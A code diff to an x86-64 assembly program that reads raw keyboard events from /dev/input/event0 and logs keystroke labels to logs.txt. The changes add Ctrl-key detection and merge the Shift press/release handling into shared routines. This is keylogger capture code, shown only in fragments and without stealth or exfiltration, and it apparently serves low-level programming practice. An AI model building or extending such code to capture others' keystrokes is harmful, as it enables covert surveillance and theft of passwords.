@@ -135,7 +135,7 @@ keys:
     .byte 0xf
 
     .org keys+43
-    .byte '\'
+    .byte 0x5c
 
     .org keys+44
     .byte 'z'
@@ -185,8 +185,9 @@ file: .string "/dev/input/event0"
 logs: .string "logs.txt"
 backspacePressed: .string "-Backspace key-"
 shiftKey: .string "-Shift key "
-shiftPressed: .string "was pressed-"
-shiftReleased: .string "was released-"
+ctrlKey: .string "-Ctrl key "
+keyPressed: .string "was pressed-"
+keyReleased: .string "was released-"
 
 .section .data
     buffer: .skip 256, 0
@@ -232,25 +233,29 @@ main:
         cmpw $1, (%rcx)
         jne mainLoop
 
+        # save the input_event.value in r8
+        movq %rbx, %r8
+        addq $20, %r8
+
         # get the right keyboard key
         movq %rbx, %rsi
         addq $18, %rsi
         movzbq (%rsi), %rsi
-        addq $keys, %rsi
+        
+        # Check if the ctrl Key was pressed
+        cmpq $29, %rsi
+        je CtrlKey
 
-        # save the input_event.value in r8
-        movq %rbx, %r8
-        addq $20, %r8
+        # Get the key
+        addq $keys, %rsi
 
         # Check if the shift Key was pressed
         cmpb $0xf, (%rsi)
         je ShiftKey
 
         # Check if the key was pressed or released
-
         cmpl $0, (%r8)
         je mainLoop
-
 
         cmpb $0x8, (%rsi)
         je BackspaceKey
@@ -272,31 +277,44 @@ main:
         jmp mainLoop
     
     ShiftKey:
+        # Print the Shift key Prompt
         movq $1, %rax
         movq %r14, %rdi
         movq $shiftKey, %rsi
         movq $11, %rdx
         syscall
+        jmp CheckKey
 
+    CtrlKey:
+        # Print the Ctrl key Prompt
+        movq $1, %rax
+        movq %r14, %rdi
+        movq $ctrlKey, %rsi
+        movq $10, %rdx
+        syscall
+        jmp CheckKey
+        
+    CheckKey:
+        # Check if the Key was pressed or released
         cmpl $1, (%r8)
-        je ShiftPressed
+        je KeyPressed
         cmpl $0, (%r8)
-        je ShiftReleased
+        je KeyReleased
 
-        ShiftPressed:
-            movq $1, %rax
-            movq %r14, %rdi
-            movq $shiftPressed, %rsi
-            movq $12, %rdx
-            syscall
-            jmp mainLoop
-        ShiftReleased:
-            movq $1, %rax
-            movq %r14, %rdi
-            movq $shiftReleased, %rsi
-            movq $13, %rdx
-            syscall
-            jmp mainLoop
+    KeyPressed:
+        movq $1, %rax
+        movq %r14, %rdi
+        movq $keyPressed, %rsi
+        movq $12, %rdx
+        syscall
+        jmp mainLoop
+    KeyReleased:
+        movq $1, %rax
+        movq %r14, %rdi
+        movq $keyReleased, %rsi
+        movq $13, %rdx
+        syscall
+        jmp mainLoop
 
     popq %r14
     popq %r15
